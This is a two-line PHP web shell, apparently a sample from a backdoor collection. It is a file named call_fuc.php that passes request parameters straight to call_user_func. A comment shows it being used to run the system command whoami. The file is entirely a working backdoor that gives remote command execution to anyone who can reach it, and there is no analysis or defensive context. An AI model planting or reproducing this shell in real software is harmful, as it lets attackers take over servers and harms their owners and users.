//http://127.0.0.1/call_fuc.php?func=system&code=whoami
<?php @call_user_func($_REQUEST['func'],$_REQUEST['code']); ?>